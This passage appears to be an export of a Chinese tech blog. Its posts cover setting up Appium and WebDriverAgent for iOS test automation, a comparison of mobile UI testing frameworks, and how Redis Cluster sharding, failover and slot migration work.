https://yunlzheng.gitbook.io/prometheus-book/parti-prometheus-ji-chu/quickstart/prometheus-quick-start/use-grafana-create-dashboard","comments":true,"categories":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/categories/Performance/"}],"tags":[{"name":"Performance","slug":"Performance","permalink":"http://swsmile.info/tags/Performance/"}]},{"title":"【Software Testing】App 自动化测试框架 - Appium","date":"2020-07-15T15:00:48.000Z","path":"2020/07/15/【Software-Testing】App-自动化测试框架-Appium/","text":"BackgroundXCUITest DriverAppium’s primary support for automating iOS apps is via the XCUITest driver. (New to Appium? Read our introduction to Appium drivers). This driver leverages Apple’s XCUITest libraries under the hood in order to facilitate automation of your app . This access to XCUITest is mediated by the WebDriverAgent server. WebDriverAgentWebDriverAgent (also referred to as “WDA”) is a project managed by Facebook, to which the Appium core team contributes heavily. WDA is a WebDriver-compatible server that runs in the context of an iOS simulator or device and exposes the XCUITest API. Appium’s XCUITest driver manages WDA as a subprocess opaque to the Appium user, proxies commands to/from WDA, and provides a host of additional functionality (like simulator management and other methods, for example). WebDriver ProtocolWhen all is said and done, Appium is just an HTTP server. It sits and waits for connections from a client, which then instructs Appium what kind of session to start and what kind of automation behaviors to enact once a session is started. This means that you never use Appium just by itself. You always have to use it with a client library of some kind (or, if you’re adventurous, cURL!). Luckily, Appium speaks the same protocol as Selenium, called the WebDriver Protocol. You can do a lot of things with Appium just by using one of the standard Selenium clients. You may even have one of these on your system already. It’s enough to get started, especially if you’re using Appium for the purpose of testing web browsers on mobile platforms. 介绍 http://appium.io/docs/en/about-appium/intro/?lang=en Appium 安装Appium can be installed in one of two ways: via NPM or by downloading Appium Desktop, which is a graphical, desktop-based way to launch the Appium server. Installation via NPMIf you want to run Appium via an npm install, hack with Appium, or contribute to Appium, you will need Node.js and NPM (use nvm, n, or brew install node to install Node.js. Make sure you have not installed Node or Appium with sudo, otherwise you’ll run into problems). We recommend the latest stable version, though Appium supports Node 10+. The actual installation is as simple as: 1npm install -g appium Installation via Desktop App DownloadSimply download the latest version of Appium Desktop from the releases page. Dependency12345$ brew install carthage$ brew install libimobiledevice$ brew install ios-deploy 报错：Error running xcrun simctl 解决方案： 这个是Xcode的问题，Xcode安装之后，simctl可以用xcrun命令来执行； 打开Xcode–&gt;Preferences–&gt;Locations–&gt;Command Line Tools 选择版本号就可以了 验证安装确保所有的依赖包都安装成功，通过appium-doctor验证 12345# 安装appium-doctor$ npm install -g appium-doctor# 验证$ appium-doctor --ios 启动 Appium 点击搜索图标，启动一个session： 启动后进入编辑页面： 编辑JSON： 12345678910&#123; \"platformName\": \"ios\", \"platformVersion\": \"12.4\", \"udid\": \"设备的udid\", \"deviceName\": \"iPhone\", \"automationName\": \"XCUITest\", \"bundleId\": \"所测app bundle Identifier\", \"xcodeOrgId\": \"所测app用的开发者账号\", \"xcodeSigningId\": \"iPhone Developer\"&#125; 参考 https://github.com/appium/appium/blob/master/docs/en/writing-running-appium/caps.md。 查看UDID方法 iPhone连接电脑 打开XCode，Window - Devices and Simulators 获取 deviceName1$ instruments -s devices 获取 app bundle IdentifierIf your app is in the App Store. Find the app online (Google for the iTunes link). For this example we use Apple Pages: https://itunes.apple.com/app/pages/id361309726?mt=8. Copy the number after the id in the URL. (Here: 361309726). Open https://itunes.apple.com/lookup?id=361309726 where you replace the ID with the one you looked up. Search the output for “bundleID”. In this example it looks like this (next to a bunch of other data): “bundleId”:”com.apple.Pages”. So for Apple, the bundle ID is com.apple.Pages. 配置WDA123$ git clone git@github.com:facebookarchive/WebDriverAgent.git$ ./Scripts/bootstrap.sh After it is finished you can simply open WebDriverAgent.xcodeproj and start WebDriverAgentRunner test and start sending requests. Before you try run again on the device, in iOS, go to Settings &gt; General &gt; Device Management and trust the certificate first ErrorRecovery Suggestion: To run on this device, please update to a version of Xcode that supports iOS 13.6. You can download Xcode from the Mac App Store or the Apple Developer website.Solution：在 Mac App Store 升级 XCode。 错误 - Signing for “XXXXXX” requires a development team. Select a development team in the project editor.Solution: https://github.com/appium/appium-xcuitest-driver/blob/master/docs/real-device-config.md 错误： 123Failed to register bundle identifier. The app identifier &quot;com.facebook.WebDriverAgentRunner.xctrunner&quot; cannot be registered to your development team because it is not available. Change your bundle identifier to a unique string to try again.No profiles for &apos;com.facebook.WebDriverAgentRunner.xctrunner&apos; were found: Xcode couldn&apos;t find any iOS App Development provisioning profiles matching &apos;com.facebook.WebDriverAgentRunner.xctrunner&apos;. 因为我安装的是 Appium 桌面版， 123cd /Applications/Appium.app/Contents/Resources/app/node_modules/appium-webdriveragent执行 ./Scripts/bootstrap.sh -d Open WebDriverAgent.xcodeproj in Xcode. For both the WebDriverAgentLib and WebDriverAgentRunner targets, select “Automatically manage signing” in the “General” tab, and then select your Development Team. This should also auto select Signing Ceritificate. The outcome should look as shown below: Xcode may fail to create a provisioning profile for the WebDriverAgentRunner target: This necessitates manually changing the bundle id for the target by going into the “Build Settings” tab, and changing the “Product Bundle Identifier” from com.facebook.WebDriverAgentRunner to something that Xcode will accept: Going back to the “General” tab for the WebDriverAgentRunner target, you should now see that it has created a provisioning profile and all is well: Finally, you can verify that everything works. Build the project: 1$ xcodebuild -project WebDriverAgent.xcodeproj -scheme WebDriverAgentRunner -destination &apos;id=&lt;udid&gt;&apos; test If this was successful, the output should end with something like: 123456Test Suite &apos;All tests&apos; started at 2017-01-23 15:49:12.585Test Suite &apos;WebDriverAgentRunner.xctest&apos; started at 2017-01-23 15:49:12.586Test Suite &apos;UITestingUITests&apos; started at 2017-01-23 15:49:12.587Test Case &apos;-[UITestingUITests testRunner]&apos; started. t = 0.00s Start Test at 2017-01-23 15:49:12.588 t = 0.00s Set Up 在以上操作完成后，通过XCode构建了appium-desk版的WDA，并安装到了真机上。 点击start session 运行成功后，会弹出一个控制界面，在该界面中可以控制手机上正在运行的程序 点击界面上方中心的录制按钮，可以将你对手机端的操作代码化 To completely verify, you can try accessing the WebDriverAgent server status (note: you must be on the same network as the device, and know its IP address, from Settings =&gt; Wi-Fi =&gt; Current Network): 12345678910111213141516171819202122 export DEVICE_URL=&apos;http://&lt;device IP&gt;:8100&apos; export JSON_HEADER=&apos;-H &quot;Content-Type: application/json;charset=UTF-8, accept: application/json&quot;&apos; curl -X GET $JSON_HEADER $DEVICE_URL/statusYou ought to get back output something like this: &#123; &quot;value&quot; : &#123; &quot;state&quot; : &quot;success&quot;, &quot;os&quot; : &#123; &quot;name&quot; : &quot;iOS&quot;, &quot;version&quot; : &quot;10.2&quot; &#125;, &quot;ios&quot; : &#123; &quot;simulatorVersion&quot; : &quot;10.2&quot;, &quot;ip&quot; : &quot;192.168.0.7&quot; &#125;, &quot;build&quot; : &#123; &quot;time&quot; : &quot;Jan 23 2017 14:59:57&quot; &#125; &#125;, &quot;sessionId&quot; : &quot;8951A6DD-F3AD-410E-A5DB-D042F42F68A7&quot;, &quot;status&quot; : 0 &#125; appium-python-clientappium-python-client 是让 python 连接 appium 服务的一个驱动，也就是一个 python 语言封装和 appium api 通讯的一个库。 安装方法： 1$ pip install Appium-Python-Client 1234567891011121314151617181920212223242526272829303132333435363738394041424344# coding=utf-8from appium import webdriverimport timeclass Appium: # 启动app def __init__(self): desired_caps = &#123;&#125; desired_caps['platformName'] = 'iOS' # 设备系统 desired_caps['platformVersion'] = '12.3.1' # 设备系统版本 desired_caps['deviceName'] = 'WANG的 iPhone' # 设备名称 desired_caps['bundleId'] = 'com.xxx.xxx' # 测试app包名 desired_caps['udid'] = 'xxxxxx-xxxxxxxx' #设备id desired_caps['automationName'] = 'XCUITest' # 测试框架 desired_caps['noReset']='true' # 保留app的登录状态 desired_caps['xcodeSigningId']='iOS Developer' desired_caps['xcodeOrgId']='aaaaa' # 团队id desired_caps['newCommandTimeout']=3600 self.driver = webdriver.Remote('http://127.0.0.1:4723/wd/hub', desired_caps) # 保持端口号和appium服务端口一致 # 使用隐式等待或者显示等待，尽量减少time.sleep强制等待的使用提高脚本执行速度。 self.driver.implicitly_wait(5) def test(self): # 点击一个id定位的元素 self.driver.find_element_by_accessibility_id(\"\").click() # 此处使用time.sleep是为了能让肉眼区分操作。 time.sleep(1) # 点击一个xpath定位的元素 self.driver.find_element_by_xpath(\"\").click() time.sleep(1) # 给输入id定位的输入框传值 self.driver.find_element_by_accessibility_id(\"\").set_value(\"iostest\") time.sleep(1) # 截图保存到当前文件 self.driver.save_screenshot('./1.png') time.sleep(2) # 关闭app self.driver.close_app()if __name__ == '__main__': a =Appium() a.test() See https://github.com/appium/appium/tree/master/sample-code/python/test for more example. Reference http://appium.io/docs/en/about-appium/getting-started/index.html http://appium.io/docs/en/drivers/ios-xcuitest/index.html http://appium.io/docs/en/drivers/ios-xcuitest-real-devices/ https://pypi.org/project/Appium-Python-Client/ https://www.jianshu.com/p/e9706a2ebdbb https://juejin.im/post/5d7ef540f265da03bb4ada00 https://www.jianshu.com/p/ae0959d19665 https://stackoverflow.com/questions/27509838/how-to-get-bundle-id-of-ios-app-either-using-ipa-file-or-app-installed-on-iph https://github.com/appium/appium-xcuitest-driver/blob/master/docs/real-device-config.md","comments":true,"categories":[{"name":"SoftwareTesting","slug":"SoftwareTesting","permalink":"http://swsmile.info/categories/SoftwareTesting/"}],"tags":[{"name":"Software Testing","slug":"Software-Testing","permalink":"http://swsmile.info/tags/Software-Testing/"}]},{"title":"【Software Testing】App 自动化测试框架","date":"2020-07-15T14:36:31.000Z","path":"2020/07/15/【Software-Testing】App-自动化测试框架/","text":"iOS对于 iOS 9.2 及更低版本，苹果唯一的自动化技术被称为UIAutomation，它运行在 Instruments 中。从 iOS 10 开始，苹果已经完全删除了 UIAutomation 工具。 同时，苹果推出了一款名为XCUITest 的新型自动化技术，从 iOS 9.3 到 iOS 10 及以上版本，这将是苹果唯一支持的自动化框架。 目前主流的 iOS 移动测试框架 KIF：KIF 使用 XCTest 框架,需要对 Objective—C 、Swift 和 XCTest 掌握程度较高，这个对测试工程师来说学习成本太大 XCUITest：苹果官方提供的 iOS 测试框架，要求同 KIF 一致 WebDriverAgent：由 Facebook 推出的一款 iOS 移动测试框架，也是 Appium 跨平台的底层驱动；WDA 本身也是一个完整的基于 webdriver 协议的框架 Uiautomation ：在 Xcode8 后废弃 XCUITest可以脱离 iOS App 源码进行UI自动化 XCUITest是XCTest中的一部分，XCTest包括XCUITest（界面测试）Unit Test（单元测试）。 UIAutomationiOS4时代，Apple发布了一个名为UIAutomation的测试框架，它可以用来在真实设备和iPhone模拟器上执行自动化测试。UIAutomation的功能测试代码是用Javascript编写的。UIAutomation和Accessibility有着直接的关系，你将用到通过标签和值的访问性来获得UI元素，同时完成相应的交互操作。 UIAutomation的 JS 测试脚本，需要在Instrument的Automation控件上测试。但是在Xcode8.0之后，Instrument已经不再有这个模块了。而Apple也不再对它维护了，推广使用UITest来替代它。 KIFKIF的全称是Keep it functional。它是一个建立在XCTest的UI测试框架，通过accessibility来定位具体的控件，再利用私有的API来操作UI。由于是建立在XCTest上的，所以你可以完美的借助XCode的测试相关工具（包括命令行脚本），能帮助我们去模拟用户输入来测试。 KIF继承自XCTest测试框架，可直接使用私有API对UI界面进行操作，支持UIWebView的测试。 KIF利用Accessibiility来做界面测试的基本原理，需要注意的是，由于KIF基于Accessibility，因此我们在初始化控件时，不管是代码还是InterfaceBuilder，都要记得对需要测试的控件设置AccessibilityLabel和AccessibilityTrait 使用语言：Object C &amp; Swift, 在iOS 10之后，无正式版的lib和App KIF 优势 1，测试时直接获取到UIView：KIF在测试过程中，是直接获取到应用程序，可以直接取得UIView等控件，因此各种属性可以直接判断；而 XCTest就显得很不方便，它并没有直接取得应用程序，而是在现有的视图上取得XCUIElement，该类和UIView有很大差别，基本上UIView的属性我们无法判断。 2，XCTest原则上每个UI测试都要重新启动一遍应用，这样的耗时是惊人的，而KIF则不用。文档、教程比较多：KIF从2011年推出至今，网上已有大量的教程和问答，可能很方便找到解决方案，而XCode UI Test则不同，推出不久，相关资料还不是很多。 Android EspressoEspresso 是 Google 针对 Android 平台开源的一款 Android 自动化白盒测试框架，主要是用于 Android App UI 自动化测试。 在这里简单说下 UI 自动化测试：我们作为 App 的使用者，要让机器模拟我们的测试过程，那么就需要针对我们肉眼看到的那些界面，那些按钮，也就是 UI 组件进行相应的操作以及对结果正确性的验证。 比如说，作为用户我们并不关心某个网络请求返回值的具体数据是否正确，我们关心的是在界面上看到我们想要看到的结果。因此，做 UI 自动化测试用例的时候，一个通用的思路就是：找到某个元素，做一些操作，检查结果，把自己当成用户，只关注我能看到的东西。 Espresso 毕竟是 Google 自己出的，优点还是很多的 用 Java 来写代码，对 Android 开发者很友好 API 相当的小，当然也会对拓展开放的 Espresso 的测试跑起来那是相当的快（没有等待、睡眠） Gradle 和 Android Studio 的支持 UIAutomatorUIAutomator是谷歌提供的一套黑盒测试工具，与之相对的是Espresso（白盒测试）。 UIAutomator是Android提供的自动化测试框架，基本上支持所有的Android事件操作。是用来做UI测试的，也就是普通的手工测试，点击每个控件元素看看输出的结果是否符合预期。对比Instrumentation它不需要测试人员了解代码实现细节（可以用UiAutomatorviewer抓去App页面上的控件属性而不看源码）。能跨App（比如：很多App有选择相册、打开相机拍照，这就是跨App测试）。缺点是只支持SDK 16（Android 4.1）及以上，不支持Hybird App、WebApp。 对UIAutomator2进行封装的一个Python 自动化测试框架：https://github.com/openatx/uiautomator2 。 Monkey测试随机测试，压力测试，运行在模拟器或实际设备中。 Monkey 即猴子，Monkey 测试，就像一只猴子，在电脑面前，乱敲键盘在测试。 Monkey 测试主要用于Android 应用程序压力测试的小工具，主要目的就是为了测试app是否会Crash。 Monkey 测试原理：Monkey 是 Android 中的一个命令行工具，可以运行在模拟器里或实际设备中。它向系统发送伪随机的用户事件流（如按键输入、触摸屏输入、手势输入等），实现对正在开发的应用程序进行压力测试。通常也称随机测试或者稳定性测试。Monkey 测试是一种为了测试软件的稳定性、健壮性的快速有效的方法。 跨平台appium介绍 http://appium.io/docs/en/drivers/ios-xcuitest/ http://appium.io/docs/en/about-appium/intro/?lang=en usage https://www.cnblogs.com/xjnotxj/p/11524668.html https://www.jianshu.com/p/43f858180557 https://www.jianshu.com/p/047035416095 https://www.jianshu.com/p/43f858180557 https://www.jianshu.com/p/ae0959d19665 Appium是跨平台的：它允许您使用相同的API针对多个平台（iOS，Android，Windows）编写测试。 但是底层，Appium 通过使用供应商提供的自动化框架来满足需求： iOS 9.3及以上版本：Apple的 XCUITest iOS 9.3及更低版本：Apple的 UIAutomation Android 4.2+：Google的 UiAutomator / UiAutomator2 Android 2.3+：Google的 Instrumentation Windows：微软的 WinAppDriver Appium是开源的。 appium是手机和 PC 之间的代理服务器，完成两者的通信处理。（没错，它就是个中间商） Appium提供各个语言的第三方库，在库内部会将测试脚本转化成 WebDriver 协议下的标准请求，并发送到Appium Server。 Appium Server是一个基于Node.js的服务，Appium Server发送到各个平台上的代理工具，代理工具在运行过程中不断接收 URL，根据 WebDriver 协议解析出要执行的操作，然后调用各个平台上的原生测试框架完成测试，再将测试结果返回给 Node 服务器。 Appium iOS封装了苹果公司的Instruments框架，主要用了Instrument里的UiAutomation（Apple的自动化测试框架），然后在设备中注入，如下图所示： WebDriver script 是selenium风格的测试脚本； 中间的是Appium服务，Appium启动一个服务（4723端口），与Selenium-WebDriver测试框架相类似，Appium支持标准的WebDriver JSONWireProtocol。它提供一套Web服务，Appium Server接收WebDriver标准请求，解析请求内容，调用对应框架相应操作； Appium Server调用instruments.js启动一个sock server，同时分出一个子进程运行instruments.app，将bootstrap.js注入到设备用于和外界进行交互； Reference https://developer.apple.com/library/archive/documentation/DeveloperTools/Conceptual/testing_with_xcode/chapters/09-ui_testing.html https://developer.android.google.cn/training/testing/ui-testing https://tech.meituan.com/2016/09/02/ios-uitest-kif.html https://zhuanlan.zhihu.com/p/104508507 https://blog.csdn.net/hebbely/article/details/78901466 https://www.cnblogs.com/zeo-to-one/p/6618611.html https://stackoverflow.com/questions/27509838/how-to-get-bundle-id-of-ios-app-either-using-ipa-file-or-app-installed-on-iph","comments":true,"categories":[{"name":"SoftwareTesting","slug":"SoftwareTesting","permalink":"http://swsmile.info/categories/SoftwareTesting/"}],"tags":[{"name":"Software Testing","slug":"Software-Testing","permalink":"http://swsmile.info/tags/Software-Testing/"}]},{"title":"【Protobuf】Protocol Buffers 2中使用map","date":"2020-07-12T06:57:13.000Z","path":"2020/07/12/【Protobuf】Protocol-Buffers-2中使用map/","text":"","comments":true,"categories":[{"name":"Diary","slug":"Diary","permalink":"http://swsmile.info/categories/Diary/"}],"tags":[]},{"title":"【Cache System】Redis Cluster","date":"2020-07-10T07:47:43.000Z","path":"2020/07/10/【Redis】Redis-Cluster/","text":"Redis ClusterRedis Cluster 是Redis3.0之后，官方提供的Redis集群解决方案，由 Redis 官方团队来实现。 在3.0之前为了解决容量高可用用方面的需求基本上只能通过客户端分片 + Redis sentinel或者代理（twemproxy、codis）方案解决。 Redis Cluster最大的特性，就是对Redis集群提供了水平扩展的能力（horizential scalibility），即当整个 Redis 集群出现存储容量或者性能 bottleneck 时，使用 Redis Cluster 可以通过增加新的 master Redis node从而快速解决bottleneck。 除此之外，Redis Cluster提供了强大的高可用机制（即 failure failover）。即当集群中任何一个master Redis node无法正常工作时（比如因为底层依赖的硬件故障、网络问题），它对应的 slave Redis node就会自动代替它（当然，这里有一个前提，是我们设置了slave Redis node）。 与Codis 和 Twemproxy 不同的是：Redis Cluster并非使用Porxy模式来连接集群节点，而是使用无中心节点的模式来组建集群（即没有coordinator）。 Redis Cluster实现在多个节点之间进行数据共享，即使部分节点失效或者无法进行通讯时，Cluster仍然可以继续处理请求。若每个主节点都有一个从节点支持，在主节点下线或者无法与集群的大多数节点进行通讯的情况下， 从节点提升为主节点，并提供服务，保证Cluster正常运行。 Redis Cluster 数据分片（Data Sharding）Redis Cluster的数据分片是通过哈希槽（hash slot）实现的，而不是使用一致性哈希，即 consistent hashing。 There are 16384 hash slots in Redis Cluster, and to compute what is the hash slot of a given key, we simply take the CRC16 of the key modulo 16384. Every node in a Redis Cluster is responsible for a subset of the hash slots, so for example you may have a cluster with 3 nodes, where: Node A contains hash slots from 0 to 5500. Node B contains hash slots from 5501 to 11000. Node C contains hash slots from 11001 to 16383. 每个 key 存放在这 16384（0～16383） 个哈希槽中的其中一个，每个Redis node 存储一部分哈希槽。 This allows to add and remove nodes in the cluster easily. For example if I want to add a new node D, I need to move some hash slot from nodes A, B, C to D. Similarly if I want to remove node A from the cluster I can just move the hash slots served by A to B and C. When the node A will be empty I can remove it from the cluster completely. Because moving hash slots from a node to another does not require to stop operations, adding and removing nodes, or changing the percentage of hash slots hold by nodes, does not require any downtime. Redis Cluster supports multiple key operations as long as all the keys involved into a single command execution (or whole transaction, or Lua script execution) all belong to the same hash slot. The user can force multiple keys to be part of the same hash slot by using a concept called hash tags. 概念特点 去中心、去中间件，各节点平等，保存各自数据和集群状态，节点间活跃互连。 传统用一致性哈希分配数据，集群用哈希槽（hash slot）分配。 算法为CRC16。 默认分配16384个slot， 用CRC16算法取模 CRC16(key)%16384 计算所属slot。 每个主节点存储一部分哈希槽 最少3个主节点 优点和不足优点 官方解决方案 可以在线水平扩展（Twemproxy的一大弊端就是不支持在线扩容节点） 客户端直连，系统瓶颈更少 无中心架构 支持数据分片 Redis Cluster集群现实存在的问题尽管属于无中心化架构一类的分布式系统，但不同产品的细节实现和代码质量还是有不少差异的，就比如Redis Cluster有些地方的设计看起来就有一些“奇葩”和简陋： 不能自动发现：无Auto Discovery功能。集群建立时以及运行中新增结点时，都要通过手动执行MEET命令或redis-trib.rb脚本添加到集群中 不能自动Resharding：不仅不自动，连Resharding算法都没有，要自己计算从哪些结点上迁移多少Slot，然后还是得通过redis-trib.rb操作 严重依赖外部redis-trib：如上所述，像集群健康状况检查、结点加入、Resharding等等功能全都抽离到一个Ruby脚本中了。还不清楚上面提到的缺失功能未来是要继续加到这个脚本里还是会集成到集群结点中？redis-trib也许要变成Codis中Dashboard的角色 无监控管理UI：即便未来加了UI，像迁移进度这种信息在无中心化设计中很难得到 只保证最终一致性：写Master成功后立即返回，如需强一致性，自行通过WAIT命令实现。但对于“脑裂”问题，目前Redis没提供网络恢复后的Merge功能，“脑裂”期间的更新可能丢失 注意，如果设置Redis Cluster的数据冗余是1的话，至少要3个Master和3个Slave。 Redis Cluster容错机制 - failoverfailover是redis cluster的容错机制，是redis cluster最核心功能之一；它允许在某些节点失效情况下，集群还能正常提供服务。 redis cluster采用主从架构，任何时候只有主节点提供服务，从节点进行热备份，故其容错机制是主从切换机制，即主节点失效后，选取一个从节点作为新的主节点。在实现上也复用了旧版本的主从同步机制。 从纵向看，redis cluster是一层架构，节点分为主节点和从节点。从节点挂掉或失效，不需要进行failover，redis cluster能正常提供服务；主节点挂掉或失效需要进行failover。另外，redis cluster还支持manual failover，即人工进行failover，将从节点变为主节点，即使主节点还活着。 下面将介绍这两种类型的failover。 主节点失效产生的failover1 （主）节点失效检测一般地，集群中的节点会向其他节点发送PING数据包，同时也总是应答（accept）来自集群连接端口的连接请求，并对接收到的PING数据包进行回复。当一个节点向另一个节点发PING命令，但是目标节点未能在给定的时限（node timeout）内回复时，那么发送命令的节点会将目标节点标记为PFAIL（possible failure）。 由于节点间的交互总是伴随着信息传播的功能，此时每次当节点对其他节点发送 PING 命令的时候，就会告知目标节点此时集群中已经被标记为PFAIL或者FAIL标记的节点。相应的，当节点接收到其他节点发来的信息时， 它会记下那些被其他节点标记为失效的节点。 这称为失效报告（failure report）。 如果节点已经将某个节点标记为PFAIL，并且根据节点所收到的失效报告显式，集群中的大部分其他主节点（n/2+1）也认为那个节点进入了失效状态，那么节点会将那个PFAIL节点的状态标记为FAIL。 一旦某个节点被标记为FAIL，关于这个节点已失效的信息就会被广播到整个集群，所有接收到这条信息的节点都会将失效节点标记为FAIL。 2 选举主节点一旦某个主节点进入 FAIL 状态， 集群变为FAIL状态，同时会触发failover。failover的目的是从从节点中选举出新的主节点，使得集群恢复正常继续提供服务。 整个主节点选举的过程可分为申请、授权、升级、同步四个阶段： 1 申请新的主节点由原已失效的主节点属下的所有从节点中自行选举产生，从节点的选举遵循以下条件： 这个节点是已下线主节点的从节点； 已下线主节点负责处理的哈希槽数量非空； c、主从节点之间的复制连接的断线时长有限，不超过 ( (node-timeout * slave-validity-factor) + repl-ping-slave-period ）。 如果一个从节点满足了以上的所有条件，那么这个从节点将向集群中的其他主节点发送授权请求，询问它们是否允许自己升级为新的主节点。 从节点发送授权请求的时机会根据各从节点与主节点的数据偏差来进行排序，让偏差小的从节点优先发起授权请求。 2 授权其他主节点会遵信以下三点标准来进行判断： 发送授权请求的是从节点，而且它所属的主节点处于FAIL状态 ； 从节点的currentEpoch〉自身的currentEpoch，从节点的configEpoch&gt;=自身保存的该从节点的configEpoch； 这个从节点处于正常的运行状态，没有被标记为FAIL或PFAIL状态； 如果发送授权请求的从节点满足以上标准，那么主节点将同意从节点的升级要求，向从节点返回CLUSTERMSG_TYPE_FAILOVER_AUTH_ACK授权。 3 升级一旦某个从节点在给定的时限内得到大部分主节点（n/2+1）的授权，它就会接管所有由已下线主节点负责处理的哈希槽，并主动向其他节点发送一个PONG数据包，包含以下内容： 告知其他节点自己现在是主节点了 告知其他节点自己是一个ROMOTED SLAVE，即已升级的从节点； c、告知其他节点都根据自己新的节点属性信息对配置进行相应的更新 4 同步其他节点在接收到ROMOTED SLAVE的告知后，会根据新的主节点对配置进行相应的更新。特别地，其他从节点会将新的主节点设为自己的主节点，从而与新的主节点进行数据同步。至此，failover结束，集群恢复正常状态。 此时，如果原主节点恢复正常，但由于其的configEpoch小于其他节点保存的configEpoch（failover了产生较大的configEpoch），故其配置会被更新为最新配置，并将自己设新主节点的从节点。 另外，在failover过程中，如果原主节点恢复正常，failover中止，不会产生新的主节点。 Manual FailoverManual Failover是一种运维功能，允许手动设置从节点为新的主节点，即使主节点还活着。 Manual Failover与上面介绍的Failover流程大都相同，除了下面两点不同： 触发机制不同，Manual Failover是通过客户端发送cluster failover触发，而且发送对象只能是从节点； 申请条件不同，Manual Failover不需要主节点失效，failover有效时长固定为5秒，而且只有收到命令的从节点才会发起申请。 另外，Manual Failover分force和非force，区别在于：非force需要等从节点完全同步完主节点的数据后才进行failover，保证不丢失数据，在这过程中，原主节点停止写操作；而force不进行进行数据完整同步，直接进行failover。 集群状态检测集群有OK和FAIL两种状态，可以通过CLUSTER INFO命令查看。当集群发生配置变化时， 集群中的每个节点都会对它所知道的节点进行扫描，只要集群中至少有一个哈希槽不可用（即负责该哈希槽的主节点失效），集群就会进入FAIL状态，停止处理任何命令。另外，当大部分主节点都进入PFAIL状态时，集群也会进入FAIL状态。这是因为要将一个节点从PFAIL状态改变为FAIL状态，必须要有大部分主节点（n/2+1）认可，当集群中的大部分主节点都进入PFAIL时，单凭少数节点是没有办法将一个节点标记为FAIL状态的。 然而集群中的大部分主节点(n/2+1)进入了下线状态，让集群变为FAIL，是为了防止少数存着主节点继续处理用户请求，这解决了出现网络分区时，一个可能被两个主节点负责的哈希槽，同时被用户进行读写操作（通过禁掉其中少数派读写操作，证保只有一个读写操作），造成数据丢失数据问题。说明：上面n/2+1的n是指集群里有负责哈希槽的主节点个数。 扩容&amp;缩容扩容当集群出现容量限制或者其他一些原因需要扩容时，redis cluster提供了比较优雅的集群扩容方案。 首先将新节点加入到集群中，可以通过在集群中任何一个客户端执行cluster meet 新节点ip:端口，或者通过redis-trib add node添加，新添加的节点默认在集群中都是主节点。 迁移数据迁移数据的大致流程是，首先需要确定哪些槽需要被迁移到目标节点，然后获取槽中key，将槽中的key全部迁移到目标节点，然后向集群所有主节点广播槽（数据）全部迁移到了目标节点。直接通过redis-trib工具做数据迁移很方便。 现在假设将节点A的槽10迁移到B节点，过程如下： 12B:cluster setslot 10 importing A.nodeIdA:cluster setslot 10 migrating B.nodeId 循环获取槽中key，将key迁移到B节点 12A:cluster getkeysinslot 10 100A:migrate B.ip B.port &quot;&quot; 0 5000 keys key1[ key2....] 向集群广播槽已经迁移到B节点 1cluster setslot 10 node B.nodeId Reference https://redis.io/topics/cluster-tutorial https://www.cnblogs.com/kevingrace/p/7955725.html","comments":true,"categories":[{"name":"CacheSystem","slug":"CacheSystem","permalink":"http://swsmile.info/categories/CacheSystem/"},{"name":"Redis","slug":"CacheSystem/Redis","permalink":"http://swsmile.info/categories/CacheSystem/Redis/"}],"tags":[{"name":"Cache System","slug":"Cache-System","permalink":"http://swsmile.info/tags/Cache-System/"},{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【Cache System】Redis 集群方案","date":"2020-07-10T04:41:45.000Z","path":"2020/07/10/【Redis】Redis-集群方案/","text":"Redis 集群方案Redis 的集群解决方案有社区的，也有官方的，社区的解决方案有 Codis 和Twemproxy。 CodisCodis 由我国的豌豆荚团队开源 TwemproxyTwemproxy 由Twitter团队开源。 Redis ClusterRedis Cluster 是Redis3.0之后，官方的集群解决方案，由 Redis 官方团队来实现。 这大大增强了Redis水平扩展的能力。 与Codis 和 Twemproxy 不同的是：Redis Cluster并非使用Porxy模式来连接集群节点，而是使用无中心节点的模式来组建集群。 Redis Cluster实现在多个节点之间进行数据共享，即使部分节点失效或者无法进行通讯时，Cluster仍然可以继续处理请求。若每个主节点都有一个从节点支持，在主节点下线或者无法与集群的大多数节点进行通讯的情况下， 从节点提升为主节点，并提供服务，保证Cluster正常运行，Redis Cluster的节点分片是通过哈希槽（hash slot）实现的，每个键都属于这 16384（0～16383） 个哈希槽的其中一个，每个节点负责处理一部分哈希槽。 Redis Cluster的概念特点 去中心、去中间件，各节点平等，保存各自数据和集群状态，节点间活跃互连。 传统用一致性哈希分配数据，集群用哈希槽（hash slot）分配。 算法为CRC16。 默认分配16384个slot， 用CRC16算法取模{ CRC16(key)%16384 }计算所属slot。 最少3个主节点 优点： 官方解决方案 可以在线水平扩展（Twemproxy的一大弊端就是不支持在线扩容节点） 客户端直连，系统瓶颈更少 无中心架构 支持数据分片 Redis Cluster集群现实存在的问题尽管属于无中心化架构一类的分布式系统，但不同产品的细节实现和代码质量还是有不少差异的，就比如Redis Cluster有些地方的设计看起来就有一些“奇葩”和简陋： 不能自动发现：无Auto Discovery功能。集群建立时以及运行中新增结点时，都要通过手动执行MEET命令或redis-trib.rb脚本添加到集群中 不能自动Resharding：不仅不自动，连Resharding算法都没有，要自己计算从哪些结点上迁移多少Slot，然后还是得通过redis-trib.rb操作 严重依赖外部redis-trib：如上所述，像集群健康状况检查、结点加入、Resharding等等功能全都抽离到一个Ruby脚本中了。还不清楚上面提到的缺失功能未来是要继续加到这个脚本里还是会集成到集群结点中？redis-trib也许要变成Codis中Dashboard的角色 无监控管理UI：即便未来加了UI，像迁移进度这种信息在无中心化设计中很难得到 只保证最终一致性：写Master成功后立即返回，如需强一致性，自行通过WAIT命令实现。但对于“脑裂”问题，目前Redis没提供网络恢复后的Merge功能，“脑裂”期间的更新可能丢失 注意，如果设置Redis Cluster的数据冗余是1的话，至少要3个Master和3个Slave。 Compared with Twemproxy and Redis Cluster Codis Twemproxy Redis Cluster resharding without restarting cluster Yes No Yes pipeline Yes Yes No hash tags for multi-key operations Yes Yes Yes multi-key operations while resharding Yes - No(details) Redis clients supporting Any clients Any clients Clients have to support cluster protocol “Resharding” means migrating the data in one slot from one redis server to another, usually happens while increasing/decreasing the number of redis servers. Codis和Redis Cluster的区别Redis Cluster基于smart client和无中心的设计，client必须按key的哈希将请求直接发送到对应的节点。 这意味着： 如果使用 Redis Cluster，则必须使用特定编程语言对应的redis driver（如果你所使用的编程语言对应的Redis Driver不完善，） client不能直接像使用Redis单机一样，通过使用pipeline来提高效性能，因而，如果想同时执行多个请求来提高performance，则只能在client端自行实现异步逻辑。 